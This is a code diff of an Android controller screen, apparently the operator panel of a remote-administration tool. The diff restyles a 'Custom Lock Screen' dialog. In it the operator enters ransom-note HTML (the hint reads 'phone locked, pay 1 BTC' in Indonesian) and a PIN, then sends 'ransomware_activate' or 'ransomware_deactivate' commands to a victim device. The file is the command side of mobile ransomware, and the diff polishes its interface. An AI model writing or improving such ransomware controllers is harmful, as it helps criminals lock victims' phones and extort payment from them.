@@ -1,11 +1,16 @@
 package com.testapp;
 
 import android.app.Activity;
-import android.app.AlertDialog;
+import android.app.Dialog;
 import android.content.Intent;
+import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
 import android.os.Bundle;
 import android.view.Gravity;
 import android.view.View;
+import android.view.Window;
+import android.view.WindowManager;
+import android.view.animation.AlphaAnimation;
 import android.view.animation.ScaleAnimation;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -75,8 +80,7 @@ public class ControlActivity extends Activity {
         lockScreenBtn.setTextColor(0xFFFFFFFF);
         lockScreenBtn.setBackgroundColor(0xFFFF1744);
         lockScreenBtn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams lockBtnParams = new LinearLayout.LayoutParams(
-                0, 72, 1);
+        LinearLayout.LayoutParams lockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
         lockBtnParams.setMargins(6, 0, 6, 0);
         lockScreenBtn.setLayoutParams(lockBtnParams);
         lockScreenBtn.setOnClickListener(v -> showLockScreenDialog());
@@ -87,13 +91,11 @@ public class ControlActivity extends Activity {
         unlockBtn.setTextColor(0xFFFFFFFF);
         unlockBtn.setBackgroundColor(0xFF00E676);
         unlockBtn.setGravity(Gravity.CENTER);
-        LinearLayout.LayoutParams unlockBtnParams = new LinearLayout.LayoutParams(
-                0, 72, 1);
+        LinearLayout.LayoutParams unlockBtnParams = new LinearLayout.LayoutParams(0, 72, 1);
         unlockBtnParams.setMargins(6, 0, 6, 0);
         unlockBtn.setLayoutParams(unlockBtnParams);
         unlockBtn.setOnClickListener(v -> sendCmd("unlock"));
         lockPanel.addView(unlockBtn);
-
         root.addView(lockPanel);
 
         // Grid Menu 2 kolom
@@ -146,33 +148,52 @@ public class ControlActivity extends Activity {
     }
 
     private void showLockScreenDialog() {
-        AlertDialog.Builder builder = new AlertDialog.Builder(this);
-        builder.setTitle("🔒 Custom Lock Screen");
+        Dialog dialog = new Dialog(this, android.R.style.Theme_Black_NoTitleBar_Fullscreen);
+        dialog.requestWindowFeature(Window.FEATURE_NO_TITLE);
+        dialog.getWindow().setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE);
 
+        // Root container
         LinearLayout container = new LinearLayout(this);
         container.setOrientation(LinearLayout.VERTICAL);
-        container.setPadding(16, 16, 16, 16);
-        container.setBackgroundColor(0xFF181818);
+        container.setBackground(getDrawable(R.drawable.card_admin));
+        container.setPadding(24, 24, 24, 24);
+        int margin = 32;
+        LinearLayout.LayoutParams rootParams = new LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
+        rootParams.setMargins(margin, margin*2, margin, margin*2);
+        container.setLayoutParams(rootParams);
+
+        // Judul
+        TextView title = new TextView(this);
+        title.setText("🔒 Custom Lock Screen");
+        title.setTextColor(0xFFFFFFFF);
+        title.setTextSize(20);
+        title.setTypeface(null, android.graphics.Typeface.BOLD);
+        title.setPadding(0, 0, 0, 16);
+        container.addView(title);
 
         // Editor HTML
         TextView htmlLabel = new TextView(this);
         htmlLabel.setText("HTML Code:");
-        htmlLabel.setTextColor(0xFFFFFFFF);
+        htmlLabel.setTextColor(0xFF9AA3B2);
+        htmlLabel.setTextSize(12);
         container.addView(htmlLabel);
 
         EditText htmlEditor = new EditText(this);
         htmlEditor.setHint("<h1>HP TERKUNCI</h1><p>Bayar 1 BTC</p>");
         htmlEditor.setTextColor(0xFFFFFFFF);
         htmlEditor.setBackgroundColor(0xFF252525);
-        htmlEditor.setPadding(12, 12, 12, 12);
-        htmlEditor.setMinLines(4);
+        htmlEditor.setPadding(16, 12, 16, 12);
+        htmlEditor.setMinLines(5);
         htmlEditor.setGravity(Gravity.TOP);
         container.addView(htmlEditor);
 
-        // Preview WebView
+        // Preview
         TextView previewLabel = new TextView(this);
         previewLabel.setText("Preview:");
-        previewLabel.setTextColor(0xFFFFFFFF);
+        previewLabel.setTextColor(0xFF9AA3B2);
+        previewLabel.setTextSize(12);
         previewLabel.setPadding(0, 12, 0, 4);
         container.addView(previewLabel);
 
@@ -181,11 +202,10 @@ public class ControlActivity extends Activity {
         preview.getSettings().setJavaScriptEnabled(false);
         preview.setBackgroundColor(0xFF000000);
         LinearLayout.LayoutParams webParams = new LinearLayout.LayoutParams(
-                LinearLayout.LayoutParams.MATCH_PARENT, 200);
+                LinearLayout.LayoutParams.MATCH_PARENT, 220);
         preview.setLayoutParams(webParams);
         container.addView(preview);
 
-        // Update preview saat teks berubah
         htmlEditor.addTextChangedListener(new android.text.TextWatcher() {
             @Override public void beforeTextChanged(CharSequence s, int start, int count, int after) {}
             @Override public void onTextChanged(CharSequence s, int start, int before, int count) {}
@@ -197,7 +217,8 @@ public class ControlActivity extends Activity {
         // PIN Input
         TextView pinLabel = new TextView(this);
         pinLabel.setText("PIN (4-6 digit):");
-        pinLabel.setTextColor(0xFFFFFFFF);
+        pinLabel.setTextColor(0xFF9AA3B2);
+        pinLabel.setTextSize(12);
         pinLabel.setPadding(0, 12, 0, 4);
         container.addView(pinLabel);
 
@@ -205,14 +226,21 @@ public class ControlActivity extends Activity {
         pinInput.setHint("1234");
         pinInput.setTextColor(0xFFFFFFFF);
         pinInput.setBackgroundColor(0xFF252525);
-        pinInput.setPadding(12, 12, 12, 12);
+        pinInput.setPadding(16, 12, 16, 12);
         pinInput.setInputType(android.text.InputType.TYPE_CLASS_NUMBER | android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD);
         container.addView(pinInput);
 
-        builder.setView(container);
+        // Tombol aksi
+        LinearLayout btnRow = new LinearLayout(this);
+        btnRow.setOrientation(LinearLayout.HORIZONTAL);
+        btnRow.setGravity(Gravity.CENTER);
+        btnRow.setPadding(0, 16, 0, 0);
 
-        // Tombol Jalankan
-        builder.setPositiveButton("🔒 Jalankan", (dialog, which) -> {
+        Button jalankanBtn = new Button(this);
+        jalankanBtn.setText("🔒 Jalankan");
+        jalankanBtn.setTextColor(0xFFFFFFFF);
+        jalankanBtn.setBackgroundColor(0xFF00E676);
+        jalankanBtn.setOnClickListener(v -> {
             String html = htmlEditor.getText().toString().trim();
             String pin = pinInput.getText().toString().trim();
             if (html.isEmpty() || pin.isEmpty()) {
@@ -222,15 +250,36 @@ public class ControlActivity extends Activity {
             sendCmd("ransomware_activate", new JSONObject() {{
                 try { put("html", html); put("pin", pin); } catch (Exception e) {}
             }});
+            dialog.dismiss();
         });
+        btnRow.addView(jalankanBtn);
 
-        // Tombol Matikan Lock
-        builder.setNegativeButton("🔓 Matikan Lock", (dialog, which) -> {
+        Button matikanBtn = new Button(this);
+        matikanBtn.setText("🔓 Matikan");
+        matikanBtn.setTextColor(0xFFFFFFFF);
+        matikanBtn.setBackgroundColor(0xFFFF1744);
+        matikanBtn.setOnClickListener(v -> {
             sendCmd("ransomware_deactivate");
+            dialog.dismiss();
         });
+        btnRow.addView(matikanBtn);
 
-        builder.setNeutralButton("Tutup", null);
-        builder.show();
+        container.addView(btnRow);
+
+        Button tutupBtn = new Button(this);
+        tutupBtn.setText("Tutup");
+        tutupBtn.setTextColor(0xFF9AA3B2);
+        tutupBtn.setBackgroundColor(0x00000000);
+        tutupBtn.setOnClickListener(v -> dialog.dismiss());
+        container.addView(tutupBtn);
+
+        dialog.setContentView(container);
+        dialog.show();
+
+        // Animasi fade in
+        AlphaAnimation fadeIn = new AlphaAnimation(0f, 1f);
+        fadeIn.setDuration(300);
+        container.startAnimation(fadeIn);
     }
 
     private LinearLayout createMenuCard(String[] item) {
